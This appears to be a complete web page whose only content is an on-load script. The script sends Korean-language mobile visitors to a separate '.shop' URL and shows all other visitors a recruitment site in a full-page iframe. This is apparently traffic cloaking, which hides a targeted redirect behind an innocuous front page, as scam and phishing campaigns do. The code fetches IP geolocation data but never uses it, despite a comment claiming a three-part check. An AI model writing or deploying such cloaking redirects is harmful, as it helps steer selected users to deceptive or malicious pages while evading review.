  <body onload="handleResponse()">
 
<script>
  function handleResponse() {
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

function isKoreanLang() {
    return navigator.language.startsWith('ko') || 
           navigator.languages.some(lang => lang.startsWith('ko'));
}
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        // 严格的三重条件判断
        if (isKoreanLang() && isMobileDevice() ) {
          window.location.href = "https://www.qwk623h.shop/han2/c2.html";
          return;
        }
     
        
        var iframe = document.createElement('iframe');
        iframe.src = 'https://silverswanrecruitment.com/usa/';
        iframe.style.width = '100%';
        iframe.style.height = '100vh';
        document.body.appendChild(iframe);
      })
      .catch(() => {
        // IP检测失败时严格的双重条件判断
        if (isMobileDevice() && isKoreanLang()) {
          window.location.href = "https://www.qwk623h.shop/han2/c2.html";
          return;
        }
        
        
        var iframe = document.createElement('iframe');
        iframe.src = 'https://silverswanrecruitment.com/usa/';
        iframe.style.width = '100%';
        iframe.style.height = '100vh';
        document.body.appendChild(iframe);
      });
  }
</script>
